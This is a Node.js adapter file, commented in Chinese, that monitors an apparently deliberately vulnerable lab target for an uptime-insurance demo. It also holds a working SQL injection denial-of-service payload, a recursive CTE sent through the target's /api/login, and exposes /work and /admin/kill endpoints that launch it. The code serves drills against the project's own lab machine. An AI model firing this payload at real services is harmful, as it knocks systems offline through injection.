/* Aegis 神盾 · 靶机适配层（Insure Target Bridge）
 * ------------------------------------------------------------
 * 把「链安保险靶机 insure-target」包装成 ComputeShield 能监控的被保节点，
 * 端口与接口形状完全对齐 server/node-server.js，因此 insurer.js 无需改动。
 *
 * 铁律：所有状态都来自对靶机的真实 HTTP 探测，不做任何模拟/伪造。
 *   /health     ← 实时探测靶机 /api/health
 *   /observer2  ← 第二观察者（同一靶机，独立计数）
 *   /metrics    ← 第三观察者（链上心跳锚点）
 *   /history    ← 适配器真实采样缓冲（盲区补录用，只报「可证明」的时长）
 *
 * 用法：
 *   node server/target-adapter.js
 *   环境变量：TARGET=http://127.0.0.1:8899   PORT=8787
 */
'use strict';
const http = require('http');

const PORT = Number(process.env.PORT || 8787);
const TARGET = process.env.TARGET || 'http://127.0.0.1:8899';
const SAMPLE_MS = 1000;
const KEEP = 900;                       // 保留最近 15 分钟采样

const S = {
  samples: [],        // {t, up, lat}
  reqs: 0,
  okCount: 0,
  failStreak: 0,
  startedAt: Date.now(),
  attack: null,       // 正在进行的真实攻击（/admin/kill 触发）
};

function probe(timeout = 1500) {
  return new Promise((res) => {
    const t0 = Date.now();
    const r = http.get(TARGET + '/api/health', { timeout }, (x) => {
      let b = '';
      x.on('data', (d) => { b += d; });
      x.on('end', () => {
        let up = false, info = null;
        try { const j = JSON.parse(b); up = !!(j && j.ok === true); info = j; } catch (e) { }
        res({ up, lat: Date.now() - t0, info });
      });
    });
    r.on('error', () => res({ up: false, lat: Date.now() - t0, info: null }));
    r.on('timeout', () => { r.destroy(); res({ up: false, lat: timeout, info: null }); });
  });
}

/* ── 持续采样：为「盲区补录」提供可证明的离线证据 ── */
setInterval(async () => {
  const p = await probe();
  S.reqs++;
  if (p.up) { S.okCount++; S.failStreak = 0; } else { S.failStreak++; }
  S.samples.push({ t: Date.now(), up: p.up, lat: p.lat });
  if (S.samples.length > KEEP) S.samples.shift();
}, SAMPLE_MS);

const recentFailRate = (n = 20) => {
  const w = S.samples.slice(-n);
  if (!w.length) return 0;
  return w.filter(s => !s.up).length / w.length;
};
const avgLat = (n = 10) => {
  const w = S.samples.slice(-n).filter(s => s.up);
  if (!w.length) return 0;
  return Math.round(w.reduce((a, s) => a + s.lat, 0) / w.length);
};
/* 风险分：延迟 + 近期失败率（越低越好） */
const riskOf = (lat, fr) => Math.max(0, Math.min(100, Math.round(lat / 6 + fr * 50)));

/* ── 真实致瘫攻击：SQL 注入 → 同步阻塞靶机事件循环 ──
   靶机 /api/login 用字符串拼接 SQL，且 node:sqlite 是同步执行，
   因此一条重查询就能让整个靶机停止响应（真实的资源耗尽型 DoS）。 */
function sqliBlock(n, ms = 0) {
  const email = `x' UNION ALL SELECT (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<${n}) SELECT x FROM c)), 2,3,4 -- `;
  const body = JSON.stringify({ email, password: 'x' });
  return new Promise((res) => {
    const req = http.request({
      host: new URL(TARGET).hostname, port: new URL(TARGET).port || 80,
      path: '/api/login', method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
      timeout: ms || 300000,
    }, (r) => { r.resume(); r.on('end', () => res(true)); });
    req.on('error', () => res(false));
    req.on('timeout', () => { req.destroy(); res(false); });
    req.end(body);
  });
}

const send = (res, obj) => {
  const b = JSON.stringify(obj);
  res.writeHead(200, { 'content-type': 'application/json; charset=utf-8', 'content-length': Buffer.byteLength(b), 'access-control-allow-origin': '*' });
  res.end(b);
};

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://x');
  const p = u.pathname;

  /* 主观察者：实时探测 */
  if (p === '/health') {
    const t0 = Date.now();
    const r = await probe();
    const lat = Date.now() - t0 || r.lat;
    const fr = recentFailRate();
    return send(res, {
      status: r.up ? 'ok' : 'down',
      nodeId: 'insure-target-01',
      uptime: Math.round((Date.now() - S.startedAt) / 1000),
      risk: riskOf(r.up ? Math.max(lat, avgLat()) : 1800, fr),
      avgLatency: r.up ? Math.max(lat, avgLat()) : 0,
      reqs: S.reqs,
      failStreak: S.failStreak,
      target: { url: TARGET, service: r.info && r.info.service, uptime: r.info && r.info.uptime },
      attacking: !!S.attack,
    });
  }

  /* 第二观察者 */
  if (p === '/observer2') {
    const r = await probe();
    return send(res, { status: r.up ? 'ok' : 'down', heartbeats: S.okCount, reqs: S.reqs, lat: r.lat });
  }

  /* 第三观察者（链上心跳锚点） */
  if (p === '/metrics') {
    const r = await probe();
    return send(res, { status: r.up ? 'ok' : 'down', reqs: S.reqs, okRate: S.reqs ? +(S.okCount / S.reqs).toFixed(3) : 0, lat: r.lat });
  }

  /* 盲区补录：只返回真实采样，按「可证明的最短时长」 */
  if (p === '/history') {
    const from = Number(u.searchParams.get('from') || 0) || 0;
    const win = S.samples.filter(s => s.t >= from - 1000);
    let proven = 0, contiguous = 0, downSamples = 0;
    for (const s of win) { if (!s.up) { downSamples++; contiguous += SAMPLE_MS; } else { proven += contiguous; contiguous = 0; } }
    proven += contiguous;                       // 仍在离线中的这一段也算
    return send(res, {
      hasData: win.length > 0,
      provenDownSeconds: Math.round(proven / 1000),
      downSamples,
      samples: win.slice(-120).map(s => ({ t: s.t, up: s.up, lat: s.lat })),
    });
  }

  /* 压测注入：对靶机执行「真实」的 SQL 注入阻塞（不是假装修死）。
     单请求阻塞时长取 min(ms, 1500)，保险核心 /api/attack 会并发 12 条，
     叠加成一段持续阻塞；递归次数按实测标定 ≈ 4124 次/ms。 */
  if (p === '/work') {
    const want = Number(u.searchParams.get('ms') || 0) || 0;
    const ms = Math.min(900, Math.max(0, want));
    if (ms > 0) await sqliBlock(Math.round(ms * 4124));
    const r = await probe();
    return send(res, { did: 'sqli-block', blockedMs: ms, up: r.up, lat: r.lat });
  }

  /* 演练：发起真实致瘫攻击（SQLi 阻塞），而非假装修死 */
  if (p === '/admin/kill') {
    const sec = Number(u.searchParams.get('sec') || 20);
    const n = Number(u.searchParams.get('n') || 60000000);   // ≈15s（实测 200 万 ≈ 0.48s）
    if (S.attack) return send(res, { ok: false, msg: '攻击已在进行中' });
    const rounds = Math.max(1, Math.round(sec / 15));
    S.attack = { start: Date.now(), sec, n, rounds, kind: 'sqli-recursive-dos' };
    /* 并发注入：请求在靶机事件循环里串行排队，消除轮次间隙 → 持续阻塞 */
    (async () => {
      await Promise.all(Array.from({ length: rounds }, () => sqliBlock(n)));
      S.attack = null;
    })();
    return send(res, { ok: true, msg: `已对靶机发起真实 SQL 注入致瘫攻击（${rounds} 轮）`, rounds });
  }

  /* 演练：停止续发攻击，等待靶机自行恢复 */
  if (p === '/admin/revive') {
    S.attack = null;
    const r = await probe();
    return send(res, { ok: true, msg: '已停止攻击注入，等待靶机事件循环恢复', current: r.up ? 'ok' : 'down' });
  }

  if (p === '/info') {
    return send(res, { adapter: 'insure-target-bridge', target: TARGET, samples: S.samples.length, reqs: S.reqs, okRate: S.reqs ? S.okCount / S.reqs : 0 });
  }

  send(res, { error: 'not found', path: p });
});

server.listen(PORT, '0.0.0.0', async () => {
  const r = await probe();
  console.log(`[Aegis 靶机适配层] http://127.0.0.1:${PORT}  ← 代理真实靶机 ${TARGET}`);
  console.log(`  靶机当前状态：${r.up ? '在线' : '不可达'}（延迟 ${r.lat}ms）`);
  console.log(`  所有 /health /observer2 /metrics 读数均来自对靶机的真实 HTTP 探测`);
});
